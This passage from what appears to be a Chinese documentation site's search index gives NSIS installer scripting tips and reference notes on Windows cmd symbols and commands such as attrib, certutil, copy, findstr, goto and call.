.onSelChange .onUserAbort .onVerifyInstDir 卸载逻辑回调函数: un.onGUIInit un.onInit un.onUninstFailed un.onUninstSuccess un.onGUIEnd un.onRebootFailed un.onUserAbort 其他-内置字段 部分字段 VIProductVersion \"$version\" : 定义鼠标放上去时, 显示的版本信息 VIAddVersionKey /LANG=${language} \"CompanyName\" \"xxx公司\" : 鼠标放上去时, 显示的公司名称","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-Windows-Windows-execution-file-packaging-NSIS-Script-structure.html","loc":"/yq-doc-source-docs-operating-system-Windows-Windows-execution-file-packaging-NSIS-Script-structure.html"},{"title":"一些常见错误","text":"Bad text encoding 用编辑器将编码从 UTF-8 转换为 GB2312","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-Windows-Windows-execution-file-packaging-NSIS-Some-common-errors.html","loc":"/yq-doc-source-docs-operating-system-Windows-Windows-execution-file-packaging-NSIS-Some-common-errors.html"},{"title":"一些使用问题/技巧","text":"执行 bat 不打开 dos窗口 这个玩意儿就是一个坑, 找了几乎一天的解决方案. 什么 start 启动等 这里补充一个小技巧吧, 当在nsis脚本中执行 bat 指令时, 总是会打开 dos 黑窗口, 不想要它显示, 可以使用: ExecShell 'open' '$INSTDIR\\t.bat' \"1 1 >$INSTDIR/log.txt 2>&1\" SW_HIDE 找了很久的解决方案, 网上什么start啥的都无法执行, 最后终于实验出了这个, 一开始不知道 open 也支持打开 bat, 踏了很久的坑. SW_HIDE 表示隐藏dos窗口. 详情见: NSIS_ExecShell 安装日志设置 如下: !include \"LogicLib.nsh\" ; 本区段必须放置在所有区段之前 ; 运行后会在安装目录生成一个install.log文件 Section \"-LogSetOn\" LogSet on SectionEnd code: !include \"LogicLib.nsh\" Section \"-LogSetOn\" LogSet on SectionEnd 注意可能会有报错: Error: LogSet specified, NSIS_CONFIG_LOG not defined. 这是因为当前安装版本的一些内置的东西有问题, 需要去官网下载对应版本的内容进行覆盖, 下载地址: http://sourceforge.net/projects/nsis/files/ 比如安装版本是 3.06.1 , 且是log相关的部分, 就下载这个包: 下载后, 找到安装目录, 进行文件替换. github解决地址:: chore(deploy): Release #6730 NSIS_CONFIG_LOG not defined 调试 调试只有依赖 安装日志设置 或者 消息框(MessageBox)_ 了. 使用 MessageBox: MessageBox MB_OK \"变量\\$0的值: $0\" 判断电脑位数 使用 x64.nsh !include \"x64.nsh\" ${If} ${RunningX64} ; 是64位的 ${EndIf} 检查旧版本是否已安装 需要先下载好 nsProcess.dll, 然后使用: nsProcess::_FindProcess \"xxx.exe\" 默认是没有这个dll的, 需要手动下载, 参考: 【NSIS】安装或卸载时使用nsProcess检查程序是否正在运行 下载地址: NsProcess plugin 获取当前用户名 使用 GetUserName 函数。该函数接受一个指向缓冲区的指针和缓冲区的大小，并将当前用户的用户名写入缓冲区中。 下面是示例代码: !include LogicLib.nsh ;导入LogicLib插件 Section InitPluginsDir ;初始化插件目录 ;定义变量存储用户名 Var username ;分配缓冲区的大小为256字节 StrCpy $0 256 ;调用 GetUserName 函数将用户名写入缓冲区中 System::Call 'advapi32::GetUserName(t r1, *i ${NSIS_MAX_STRLEN}) i.r0' ;如果函数返回值不为0，表示成功获取到用户名 ${If} $0 != 0 ;将缓冲区中的用户名赋值给变量 StrCpy $username $1 ${EndIf} ;打印用户名 DetailPrint \"Username: $username\" SectionEnd NSIS打包安装程序时获取管理员权限 NSIS脚本添加以下代码: RequestExecutionLevel admin NSIS安装后的脚本自动使用管理员权限 写注册表的方式: WriteRegStr HKCU \\\"SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\AppCompatFlags\\\\Layers\\\" \\\"$INSTDIR\\\\program.exe\\\" \\\"RUNASADMIN\\\" 其中program.exe为要执行的主程序的名称 将文件(夹)加入到安装包 使用 File <NSIS_File> 指令, 如果是文件, 直接跟文件全名(包括后缀), 如果是文件夹, 加 /r 选项即可. 如下例的 other 文件夹: Section Do SetOutPath $INSTDIR File /r other SectionEnd 释放对安装目录的占用 有时候在执行bat脚本时, 需要操作安装目录, 这时需要释放对安装目录的文件句柄占用, 在执行前使用 SetOutPath \"$TEMP\" 切换一下输出目录即可: Section SetOutPath \"$INSTDIR\" ; do ... SetOutPath \"$TEMP\" ;执行批处理文件 ExecWait '\"$INSTDIR\\your_batch_file.bat\"' SectionEnd 注解 这里有一个点我一直没想明白, 暂且记下来吧: 在 NSIS 脚本中调用 bat 指令时, 看任务管理器, 实际是一个 cmd.exe 下启动的类似进程组(Windows貌似只有任务, 没有进程组的概念, 此处不做讨论). 即使调用 bat 指令时, 使用的是 ExecShell <NSIS_ExecShell> 来后台执行, 且 NSIS 脚本已经执行完成退出. 且此时的情况: NSIS 脚本退出 NSIS 调用的后台执行的 bat 脚本仍在执行 这时候会发现 bat 脚本还是拥有 $INSTDIR 安装目录的占用, 其实是 SetOutPath 的占用. 目前猜测有以下几种可能: NSIS 启动的子进程的句柄占用会传递给 bat 脚本 NSIS 脚本的句柄占用会被 cmd.exe 给拿到 具体是什么情况, 暂时没看出来... 写卸载脚本 有时候可能像自己写一个卸载脚本: WriteUninstaller \"$INSTDIR\\uninstall.exe\" 注意这个时候必须存在 Uninstall 小节, 如: Section Uninstall ; 在这里添加卸载时要执行的操作 ;Delete other/xxx ; SetOutPath \"$INSTDIR\" ; RMDir /r \"$INSTDIR\\other\" RMDir /r \"$INSTDIR\\other\" SectionEnd Uninstall 小节是预定义名称的小节, 卸载时调用. 注意这时候不能直接设置输出路径, 然后使用相对路径删除. 若有需要卸载时调用的函数, 函数名需以 un. 开头. 卸载预定义函数见: 回调函数 申请管理员权限 在nsis脚本开头写入: RequestExecutionLevel admin 即可在执行安装程序时弹出申请管理员权限窗口. 若没有, 看看后面是不是重复写了其他权限如: RequestExecutionLevel user 再不行就是低版本nsis或操作系统版本低不支持. 安装与卸载时变量共享 能共享的变量只有预定义的一些内置变量, 目前自己测试过可行的只有: $INSTDIR 且只能是一开始定义的安装目录, 若后续在安装时有修改, 卸载时此修改不生效. 故, 要想共享, 最简单的就是使用注册表了, 注意要申请管理员权限提权才能写注册表, 例: RequestExecutionLevel user Var HomeDir Section Do1 WriteUninstaller \"$INSTDIR\\uninstall.exe\" StrCpy $HomeDir \"D:\\Program Files\\test\\Example2\" ; 将变量的值写入卸载程序 WriteRegStr HKLM \"Software\\TNsis\" \"AppHomeDir\" \"$HomeDir\" SectionEnd Section Uninstall ; 读取变量的值 ReadRegStr $HomeDir HKLM \"Software\\TNsis\" \"AppHomeDir\" MessageBox MB_OK \"The value of HomeDir is $HomeDir\" ; 删除注册表键 DeleteRegKey HKLM \"Software\\TNsis\" RMDir /r \"$HomeDir\" SectionEnd 注册表相关操作可参考: NSIS_注册表操作 其他方式可以通过写文件的方式, 有点麻烦, 暂不表述 GUI界面选择安装路径 需要先导入 MUI.nsh , 然后插入页面: !include \"MUI.nsh\" !insertmacro MUI_PAGE_DIRECTORY ; 选择安装路径页面 !insertmacro MUI_PAGE_INSTFILES ; 选择安装文件页面 InstallDir \"$PROGRAMFILES\\MyApp\" ; 指定默认安装路径 !insertmacro MUI_PAGE_FINISH ; 安装完成页面 注意, 选择安装位置的执行时间在 init 之后, 所以要在 init 之后的 section 获取安装位置才是可靠的. 此头文件详情可见: /docs/操作系统/windows/windows执行文件打包/nsis/常用头文件 NSIS 卸载程序参数 /q 表示静默安装 _? 表示是否打开GUI确认卸载框 _?=0：不需要用户确认，直接执行卸载操作; _?=1：需要用户确认，打开卸载确认对话框; _?=2：需要用户确认，但不需要显示卸载确认对话框. 默认情况下，NSIS脚本会自动向卸载程序传递一个 _?=1 的命令行参数. 卸载时的返回值 暂时无解, 至少我目前没找到 SetUninstallReturnValue eg: Function un.onUninstSuccess ; 在这里执行卸载成功后的清理操作 SetUninstallReturnValue 1234 ; 手动抛出返回值 MessageBox MB_OK \"卸载程序返回值：$0\" FunctionEnd 这个貌似 只有旧版本的NSIS有指令 , 新版本暂时没找到支持的方法, 暂时通过 判断安装目录是否存在确定是否卸载成功 : 卸载程序名称确定: StrCpy $1 \"$INSTDIR\\uninstall.exe\" 获取目录字符串的长度, 然后获取目录: StrLen $9 $1 IntOp $8 $9 - 14 StrCpy $7 $1 $8 MessageBox MB_OK \"dir: $7\" 确定目录是否存在: IfFileExists \"$7\" +1 +2 MessageBox MB_OK \"dir exists: $7 \" MessageBox MB_OK \"dir not exists: $7 \" 卸载成功的话文件是会被全部删除的. 除非特意留下某些残留, 那就需要自行兼容处理了. 获取安装窗体句柄 使用变量 $HWNDPARENT 将窗体前台显示 使用 BringToFront 指令. 不过存在一个问题, 有时候前台显示效果是: 在任务栏闪烁, 点击闪烁图标后后才会前台显示","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-Windows-Windows-execution-file-packaging-NSIS-Some-problems-and-skills.html","loc":"/yq-doc-source-docs-operating-system-Windows-Windows-execution-file-packaging-NSIS-Some-problems-and-skills.html"},{"title":"windows下关机程序正在运行问题","text":"一般情况下直接不管就行， 我的问题是，发现有一个名叫 t 的程序但是我没执行过，于是就去任务管理器里找，一直没找到到。 tasklist 也找了没有。 于是研究了一下， 发现这个提示的名称并不是进程名， 而是进程打开窗口的那个进程的 title 这里感谢知友的这篇帖子： Windows关机提示\"这个应用阻止关机\"，怎样确认是什么程序？？ 需要查看软件标题的话就需要工具了，比如： nirsoft的GUIPropView 下载地址： GUIPropView 下载后解压点击title排序即可","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-Windows-Windows-lower-clearance-program-is-running-problems.html","loc":"/yq-doc-source-docs-operating-system-Windows-Windows-lower-clearance-program-is-running-problems.html"},{"title":"Windows打开Debian问题（虚拟机无法打开问题）","text":"参考的对象类型不支持尝试的操作。 报错 参考的对象类型不支持尝试的操作。 Press any key to continue... 原因 使用代理软件, 或游戏加速服务, winsock出现问题。 注解 我这里是开启内存完整性引起的 单次解决 netsh winsock reset 注解 后面发现是因为我开启了内存完整性, 会影响虚拟机启动, 还有docker容器启动, 关闭即可 Win11 内存完整性关闭状态 后面补充， 发现还可能有个原因是没有开启Hyper-V 在windows功能里安装打开即可 打开功能Hyper-V","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-Windows-Windows-opens-the-Debian-problem.html","loc":"/yq-doc-source-docs-operating-system-Windows-Windows-opens-the-Debian-problem.html"},{"title":"windows_shell符号","text":"一些符号 原文: 符号的用法 单符号 ~ ~ ① 在for中表示使用增强的变量扩展。 ② 在%var:~n,m%中表示使用扩展环境变量指定位置的字符串。 ③ 在set/a中表示一元运算符，将操作数按位取反。 ! ! ① 在set /a中一元运算符，表示逻辑非。比如set /a a=!0，这时a就表示逻辑1。 @ @ ① 隐藏命令行本身的回显，常用于批处理中。 $ $ ① 在findstr命令里面表示一行的结束。 ② 在prompt命令里面，表示将其后的字符转义（符号化或者效果化）。 % % ① 在set /a中的二元运算符，表示算术取余。 ② 命令行环境下，在for命令in前，后面接一个字符（可以是字母、数字或者一些特定字符），表示指定一个循环或者遍历指标变量。 ③ 批处理中，后接一个数字表示引用本批处理当前执行时的指定的参数。 ④ 其它情况下，%将会被脱去（批处理）或保留（命令行） &#94; &#94; ① 取消特定字符的转义作用，比如& | > < ! \"等，但不包括%。比如要在屏幕显示一些特殊的字符，比如> >> | &#94; &等符号时， 就可以在其前面加一个&#94;符号来显示这个&#94;后面的字符了，&#94;&#94;就是显示一个&#94;，&#94;|就是显示一个|字符了; ② 在set/a中的二元运算符，表示按位异或。 ③ 在findstr/r的[]中表示不匹配指定的字符集。 & & ① 命令连接字符。比如我要在一行文本上同时执行两个命令，就可以用&命令连接这两个命令。 ② 在set/a中是按位与。 * * ① 代表任意个任意字符，就是我们通常所说的\"通配符\";比如想在c盘的根目录查找c盘根目录里所有的文本文件(.txt)，那么就可以输入命令\"dir c:\\*.txt\"。 ② 在set /a中的二元运算符，表示算术乘法。 ③ 在findstr/r中表示将前一个字符多次匹配。 - - ① 范围表示符，比如日期的查找，for命令里的tokens操作中就可以用到这个字符。 ② 在findstr/r中连接两个字符表示匹配范围。 ③ -跟在某些命令的/后表示取反向的开关。 ④ 在set /a中： 1.表示一个负数。 2.表示算术减运算。 + + ① 主要是在copy命令里面会用到它，表示将很多个文件合并为一个文件，就要用到这个+字符了。 ② 在set/a中的二元运算符,表示算术加法。 : : ① 标签定位符，表示其后的字符串为以标签，可以作为goto命令的作用对象。比如在批处理文件里面定义了一个\":begin\"标签，用\"goto begin\"命令就可以转到\":begin\"标签后面来执行批处理命令了。 ② 在%var:string1=string2%中分隔变量名和被替换字串关系。 | | ① 管道符，就是将上一个命令的输出，作为下一个命令的输入.\"dir /a/b |more\"就可以逐屏的显示dir命令所输出的信息。 ② 在set/a中的二元运算符，表示按位或。 ③ 在帮助文档中表示其前后两个开关、选项或参数是二选一的。 / / ① 表示其后的字符（串）是命令的功能开关（选项）。比如\"dir /s/b/a-d\"表示\"dir\"命令指定的不同的参数。 ② 在set/a中表示除法。 > > ① 命令重定向符，将其前面的命令的输出结果重新定向到其后面的设备中去，后面的设备中的内容被覆盖。比如可以用\"dir > lxmxn.txt\"将\"dir\"命令的结果输出到\"lxmxn.txt\"这个文本文件中去。 ② 在findstr/r中表示匹配单词的右边界，需要配合转义字符\\使用。 < < ① 将其后面的文件的内容作为其前面命令的输入。 ② 在findstr/r中表示匹配单词的左边界，需要配合转义字符\\使用。 = = ① 赋值符号，用于变量的赋值。比如\"set a=windows\"的意思意思是将\"windows\"这个字符串赋给变量\"a\"。 ② 在set/a中表示算术运算，比如\"set /a x=5-6*5\"。 \\ \\ ① 这个\"\\\"符号在有的情况下，代表的是当前路径的根目录.比如当前目录在c:\\windows\\system32下，那么你\"dir \\\"的话，就相当与\"dir c:\\\"。 ② 在findstr/r中表示正则转义字符。 , , ① 在set /a中表示连续表达式的分割符。 ② 在某些命令中分割元素。 . . ① 在路径的\\后紧跟或者单独出现时： 一个.表示当前目录。 两个.表示上一级目录。 ② 在路径中的文件名中出现时： 最后的一个.表示主文件名与扩展文件名的分隔。 ? ? ① 在findstr/r中表示在此位置匹配一个任意字符。 ② 在路径中表示在此位置通配任意一个字符。 ③ 紧跟在/后表示获取命令的帮助文档。 多符号(符号不能分隔) && && ① 连接两个命令，当&&前的命令成功时，才执行&&后的命令。 || || ① 连接两个命令，当||前的命令失败时，才执行||后的命令。 >& >& ① 将一个句柄的输出写入到另一个句柄的输入中。 <& <& ① 从一个句柄读取输入并将其写入到另一个句柄输出中。 %% %% ① 两个连续的%表示在预处理中脱为一个%。 ② 批处理中，在for语句的in子句之前，连续两个%紧跟一个字符（可以是字母、数字和一些特定字符），表示指定一个循环或者遍历指标变量。 ③ 批处理中，在for语句中，使用与in之前指定的指标变量相同的串，表示引用这个指标变量。 >> >> ① 命令重定向符，将其前面的命令的输出结果追加到其后面的设备中去。 ② 在set /a中的二元运算符，表示逻辑右移。 == == ① ==在if命令中判断==两边的元素是否相同。 << << ① 在set /a中的二元运算符，表示逻辑左移。 += += ① 在set /a中的二元运算符。例如set /a a+=b表示将a加上b的结果赋值给a。 -= -= ① 在set /a中的二元运算符。例如set /a a-=b表示将a减去b的结果赋值给a。 *= *= ① *= 在set /a中的二元运算符。例如set /a a*=b表示将a乘以b的结果赋值给a。 /= /= ① /= 在set /a中的二元运算符。例如set /a a/=b表示将a加上b的结果赋值给a。 %= %= ① %=在set /a中的二元运算符。例如set /a a%=b表示将a除以b的余数赋值给a。 【注：命令行可以直接用 set /a a%=b ，在批处理里面可以用 set /a a%%=b 。】 &#94;= &#94;= ① 在set /a中的二元运算符。例如set /a a\"&#94;=\"b表示将a与b按位异的结果赋值给a。 【注：这里 \"&#94;=\" 加引号是为了防止&#94;被转义，下同。】 &= &= ① 在set /a中的二元运算符。例如set /a a\"&=\"b表示将a与b按位与的结果赋值给a。 |= |= ① 在set /a中的二元运算符。例如set /a a\"|=\"b表示将a与b按位或的结果赋值给a。 <<= <<= ① 在set /a中的二元运算符。例如set /a a\"<<=\"b表示将a按位左移b位的结果赋值给a。 >>= >>= ① 在set /a中的二元运算符。例如set /a a\">>=\"b表示将a按位右移b位的结果赋值给a。 \\< \\< ① \\< 在findstr的一般表达式中表示字的开始处。 \\> \\> ① \\> 在findstr的一般表达式中表示字的结束处。 双符号对(两个符号之间须指定字符串) ! ! ! ! ① ! ! 当启用变量延迟时，使用!!将变量名扩起来表示对变量值的引用。 ' ' ' ' ① 在for/f中表示将它们包含的内容当作命令行执行并分析其输出。 ② 在for/f \"usebackq\"中表示将它们包含的字符串当作字符串分析。 ( ) ( ) ① 命令包含或者是具有优先权的界定符，比如for命令要用到这个()，我们还可以在if，echo等命令中见到它的身影。 ② 在set /a中表示表达式分组。 \" \" \" \" ① 界定符，在表示带有空格的路径时常要用\"\"来将路径括起来，在一些命令里面也需要\" \"符号。 ② 在for/f中将表示它们包含的内容当作字符串分析。 ③ 在for/f \"usebackq\"表示它们包含的内容当作文件路径并分析其文件的内容。 ④ 在其它情况下表示其中的内容是一个完整的字符串，其中的>、>>、<、&、|、空格等不再转义。 ` ` ` ` ① 在for/f中表示它们所包含的内容当作命令行执行并分析它的输出。 % % % % ① 使用两个单独的%包含一个字符串表示引用以此串为名的环境变量。比如一个%time%可以扩展到当前的系统时间。 [ ] [ ] ① 在帮助文档表示其中的开关、选项或参数是可选的。 ② 在findstr /r中表示按其中指定的字符集匹配。","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-Windows-Windows_shell-symbol.html","loc":"/yq-doc-source-docs-operating-system-Windows-Windows_shell-symbol.html"},{"title":"attrib","text":"显示或更改文件属性: ATTRIB [+R | -R] [+A | -A] [+S | -S] [+H | -H] [+O | -O] [+I | -I] [+X | -X] [+P | -P] [+U | -U] [drive:][path][filename] [/S [/D]] [/L] 选项/参数说明: + 设置属性。 - 清除属性。 R 只读文件属性。 A 存档文件属性。 S 系统文件属性。 H 隐藏文件属性。 O 脱机属性。 I 无内容索引文件属性。 X 无清理文件属性。 V 完整性属性。 P 固定属性。 U 非固定属性。 [drive:][path][filename] 指定属性要处理的文件。 /S 处理当前文件夹及其所有子文件夹中 的匹配文件。 /D 也处理文件夹。 /L 处理符号链接和 符号链接目标的属性 例: md autorun attrib +a +s +h autorun 上面的命令将建立文件夹autorun，然后将其设为存档、系统、隐藏属性","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-Windows-windows_shell-Attrib.html","loc":"/yq-doc-source-docs-operating-system-Windows-windows_shell-Attrib.html"},{"title":"certutil","text":"windows下 查看文件 MD5 SHA1 SHA256 certutil -hashfile filename MD5 certutil -hashfile filename SHA1 certutil -hashfile filename SHA256","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-Windows-windows_shell-CertUtil.html","loc":"/yq-doc-source-docs-operating-system-Windows-windows_shell-CertUtil.html"},{"title":"cd","text":"显示当前目录名或改变当前目录: CHDIR [/D] [drive:][path] CHDIR [..] CD [/D] [drive:][path] CD [..] .. 指定要改成父目录。 键入 CD drive: 显示指定驱动器中的当前目录。 不带参数只键入 CD，则显示当前驱动器和目录。 使用 /D 开关，除了改变驱动器的当前目录之外，还可改变当前驱动器。 如果命令扩展被启用，CHDIR 会如下改变: 当前的目录字符串会被转换成使用磁盘名上的大小写。 所以，如果磁盘上的大小写如此， CD C:\\TEMP 会将当前目录设为 C:\\Temp CHDIR 命令不把空格当作分隔符，因此有可能将目录名改为一个 带有空格但不带有引号的子目录名。例如: cd \\winnt\\profiles\\username\\programs\\start menu 与下列相同: cd \"\\winnt\\profiles\\username\\programs\\start menu\" 在扩展停用的情况下，你必须键入以上命令。 特别说明-更新驱动器 一般而言, 直接使用 cd 命令时, 不能更改驱动器, 只有加 /d 选项时, 才支持更改驱动器. 如: ; 无效 C:\\Users>cd \"D:\\Program Files\" ; 有效 C:\\Users>cd /d \"D:\\Program Files\" D:\\Program Files>","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-Windows-windows_shell-Chengdu.html","loc":"/yq-doc-source-docs-operating-system-Windows-windows_shell-Chengdu.html"},{"title":"copy","text":"将一份或多份文件复制到另一个位置: COPY [/D] [/V] [/N] [/Y | /-Y] [/Z] [/L] [/A | /B ] source [/A | /B] [+ source [/A | /B] [+ ...]] [destination [/A | /B]] source 指定要复制的文件。 /A 表示一个 ASCII 文本文件。 /B 表示一个二进位文件。 /D 允许解密要创建的目标文件 destination 为新文件指定目录和/或文件名。 /V 验证新文件写入是否正确。 /N 复制带有非 8dot3 名称的文件时， 尽可能使用短文件名。 /Y 不使用确认是否要覆盖现有目标文件 的提示。 /-Y 使用确认是否要覆盖现有目标文件 的提示。 /Z 用可重新启动模式复制已联网的文件。 /L 如果源是符号链接，请将链接复制 到目标而不是源链接指向的实际文件。 命令行开关 /Y 可以在 COPYCMD 环境变量中预先设定。 这可能会被命令行上的 /-Y 替代。 除非 COPY命令是在一个批处理脚本中执行的，默认值应为在覆盖时进行提示。 要附加文件，请为目标指定一个文件，为源指定数个文件(用通配符或 file1+file2+file3 格式)。 与xcopy的区别 /docs/操作系统/windows/windows_shell/xcopy 在Windows的批处理脚本中，copy和xcopy命令都可以用于复制文件和目录。不过它们之间还是存在一些差异的。 copy命令是一个比较简单的复制命令，它只能复制单个文件，不能复制目录。语法: copy source_file destination_file 这个命令会将源文件拷贝到指定的目标文件中。如果目标文件已经存在，则会被覆盖。 xcopy命令则更加强大，不仅可以复制单个文件，还可以复制整个目录树。语法: xcopy source [destination] [/options] 其中，source表示要复制的源文件或目录；destination表示目标目录； /options是可选的命令行选项，可以设置例如是否复制子目录、是否覆盖现有文件等参数。 相比之下，xcopy命令比copy命令更加灵活和强大，尤其是在需要复制整个目录树时非常实用。 但也因为功能较多，命令语法也更加复杂，需要注意命令参数的正确使用。","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-Windows-windows_shell-Copy.html","loc":"/yq-doc-source-docs-operating-system-Windows-windows_shell-Copy.html"},{"title":"del","text":"删除一个或多个文件: DEL [/P] [/F] [/S] [/Q] [/A[[:]attributes]] names ERASE [/P] [/F] [/S] [/Q] [/A[[:]attributes]] names 选项: names 指定一个或多个文件或者目录列表。 通配符可用来删除多个文件。 如果指定了一个目录，该目录中的所 有文件都会被删除。 /P 删除每一个文件之前提示确认。 /F 强制删除只读文件。 /S 删除所有子目录中的指定的文件。 /Q 安静模式。删除全局通配符时，不要求确认 /A 根据属性选择要删除的文件 属性 R 只读文件 S 系统文件 H 隐藏文件 A 准备存档的文件 I 无内容索引文件 L 重新分析点 O 脱机文件 - 表示\"否\"的前缀 如果命令扩展被启用，DEL 和 ERASE 更改如下: /S 开关的显示句法会颠倒，即只显示已经删除的文件，而不显示找不到的文件。","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-Windows-windows_shell-DEL.html","loc":"/yq-doc-source-docs-operating-system-Windows-windows_shell-DEL.html"},{"title":"findstr","text":"搜索字符串, 想找类似与linux下 /docs/操作系统/linux/linux指令/grep 时找到的: PS C:\\Users\\yanque> tasklist | findstr dllhost dllhost.exe 1416 Console 9 27,020 K dllhost.exe 19296 Console 9 17,220 K 在文件中寻找字符串, 语法: FINDSTR [/B] [/E] [/L] [/R] [/S] [/I] [/X] [/V] [/N] [/M] [/O] [/P] [/F:file] [/C:string] [/G:file] [/D:dir list] [/A:color attributes] [/OFF[LINE]] strings [[drive:][path]filename[ ...]] 支持参数说明: /B 在一行的开始配对模式。 /E 在一行的结尾配对模式。 /L 按字使用搜索字符串。 /R 将搜索字符串作为一般表达式使用。 /S 在当前目录和所有子目录中搜索匹配文件。 /I 指定搜索不分大小写。 /X 打印完全匹配的行。 /V 只打印不包含匹配的行。 /N 在匹配的每行前打印行数。 /M 如果文件含有匹配项，只打印其文件名。 /O 在每个匹配行前打印字符偏移量。 /P 忽略有不可打印字符的文件。 /OFF[LINE] 不跳过带有脱机属性集的文件。 /A:attr 指定有十六进位数字的颜色属性。请见 \"color /?\" /F:file 从指定文件读文件列表 (/ 代表控制台)。 /C:string 使用指定字符串作为文字搜索字符串。 /G:file 从指定的文件获得搜索字符串。 (/ 代表控制台)。 /D:dir 查找以分号为分隔符的目录列表 strings 要查找的文字。 [drive:][path]filename 指定要查找的文件。 除非参数有 /C 前缀，请使用空格隔开搜索字符串。 例如, 在文件 x.y 中寻找 \"hello\" 或 \"there\" FINDSTR \"hello there\" x.y 文件 x.y 寻找\"hello there\" FINDSTR /C:\"hello there\" x.y 一般表达式的快速参考: . 通配符: 任何字符 * 重复: 以前字符或类出现零或零以上次数 &#94; 行位置: 行的开始 $ 行位置: 行的终点 [class] 字符类: 任何在字符集中的字符 [&#94;class] 补字符类: 任何不在字符集中的字符 [x-y] 范围: 在指定范围内的任何字符 /x Escape: 元字符 x 的文字用法 /<xyz 字位置: 字的开始 xyz/> 字位置: 字的结束 多个搜索条件使用空格隔开, 如列出当前目录下, 非 . 开头, 不以 music 或者 video 开头的结果: dir /b | findstr /v /i \"\\. music video\"","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-Windows-windows_shell-Findstr.html","loc":"/yq-doc-source-docs-operating-system-Windows-windows_shell-Findstr.html"},{"title":"goto","text":"将 cmd.exe 定向到批处理程序中带标签的行。 GOTO label label 指定批处理程序中用作标签的文字字符串。 标签必须单独一行，并且以冒号打头。 例: if %1 == 1 ( goto do1 ) else ( goto done ) :do1 echo 1 :done echo done 实际使用: if %1 == 1 ( goto do1 ) else ( goto done ) 也可以, 不知道为啥. 如果命令扩展被启用，GOTO 会如下改变: GOTO 命令现在接受目标标签 :EOF，这个标签将控制转移到当前批脚本文件的结尾。 不定义就退出批脚本文件，这是一个容易的办法。 有关能使该功能有用的 CALL 命令的扩展描述，请键入CALL /?。 看到有种说法是: rem goto:eof 相当于函数的} 结尾标记，返回到调用者位置, 如果没有调用者直接就到末尾结束了 rem exit /b 0 结束当前cmd，返回exitCode 0","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-Windows-windows_shell-GOTO.html","loc":"/yq-doc-source-docs-operating-system-Windows-windows_shell-GOTO.html"},{"title":"popd","text":"更改到 PUSHD 命令: /docs/操作系统/windows/windows_shell/pushd 存储的目录: POPD 如果命令扩展被启用，从推目录堆栈 POPD 驱动器时，POPD命令会删除 PUSHD 创建的临时驱动器号。","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-Windows-windows_shell-POPD.html","loc":"/yq-doc-source-docs-operating-system-Windows-windows_shell-POPD.html"},{"title":"rmdir","text":"删除一个目录 语法: RMDIR [/S] [/Q] [drive:]path RD [/S] [/Q] [drive:]path 选项: /S 递归删除, 用于删除目录树. 类似于 linux rm 的 -r /D 安静模式. 类似于 linux rm 的 -f 注解 大小写不敏感, 如: rmdir /s xx","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-Windows-windows_shell-RMDIR.html","loc":"/yq-doc-source-docs-operating-system-Windows-windows_shell-RMDIR.html"},{"title":"assoc","text":"显示或修改文件扩展名关联: ASSOC [.ext[=[fileType]]] .ext 指定跟文件类型关联的文件扩展名 fileType 指定跟文件扩展名关联的文件类型 键入 ASSOC 而不带参数，显示当前文件关联。 如果只用文件扩展名调用 ASSOC，则显示那个文件扩展名的当前文件关联。 如果不为文件类型指定任何参数，命令会删除文件扩展名的关联。 注解 assoc 设置 文件扩展名关联, 关联到'文件类型' 与 /docs/操作系统/windows/windows_shell/ftype 设置文件类型关联, 关联到'执行程序和参数' 类似","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-Windows-windows_shell-assoc.html","loc":"/yq-doc-source-docs-operating-system-Windows-windows_shell-assoc.html"},{"title":"call","text":"从批处理程序调用另一个批处理程序: CALL [drive:][path]filename [batch-parameters] batch-parameters 指定批处理程序所需的命令行信息。 如果命令扩展被启用，CALL 会如下改变: CALL 命令现在将卷标当作 CALL 的目标接受。语法是: CALL:label arguments 一个新的批文件上下文由指定的参数所创建，控制在卷标被指定后传递到语句。 你必须通过达到批脚本文件末两次来 \"exit\" 两次。 第一次读到文件末时，控制会回到 CALL 语句的紧后面。 第二次会退出批脚本。 键入 GOTO /?，参看 GOTO :EOF 扩展的描述，此描述允许你从一个批脚本返回。 另外，批脚本文本参数参照(%0、%1、等等)已如下改变: 批脚本里的 %* 指出所有的参数(如 %1 %2 %3 %4 %5 ...) 批参数(%n)的替代已被增强。你可以使用以下语法: %~1 - 删除引号(\")，扩展 %1 %~f1 - 将 %1 扩展到一个完全合格的路径名 %~d1 - 仅将 %1 扩展到一个驱动器号 %~p1 - 仅将 %1 扩展到一个路径 %~n1 - 仅将 %1 扩展到一个文件名 %~x1 - 仅将 %1 扩展到一个文件扩展名 %~s1 - 扩展的路径只含有短名 %~a1 - 将 %1 扩展到文件属性 %~t1 - 将 %1 扩展到文件的日期/时间 %~z1 - 将 %1 扩展到文件的大小 %~$PATH:1 - 查找列在 PATH 环境变量的目录，并将 %1 扩展到找到的第一个完全合格的名称。如果 环境变量名未被定义，或者没有找到文件， 此修改符会扩展到空字符串 可以组合修改符来取得多重结果: %~dp1 - 只将 %1 扩展到驱动器号和路径 %~nx1 - 只将 %1 扩展到文件名和扩展名 %~dp$PATH:1 - 在列在 PATH 环境变量中的目录里查找 %1， 并扩展到找到的第一个文件的驱动器号和路径。 %~ftza1 - 将 %1 扩展到类似 DIR 的输出行。 在上面的例子中，%1 和 PATH 可以被其他有效数值替换。 %~ 语法被一个有效参数号码终止。%~ 修定符不能跟 %* 使用 此处提一下与 /docs/操作系统/windows/windows_shell/start 的区别: start的调用需要在调用的bat脚本内写入 exit 才能正常返回当前bat指令 call 的退出有没有 exit /b 即可, 默认就是这个 如, 1.bat 调用 2.bat , 使用 start: 使用 call: 输出都是: C:\\Users\\烟雀\\Desktop\\some\\t\\_>1.bat end 0 end 1 C:\\Users\\烟雀\\Desktop\\some\\t\\_> 使用call时, 在 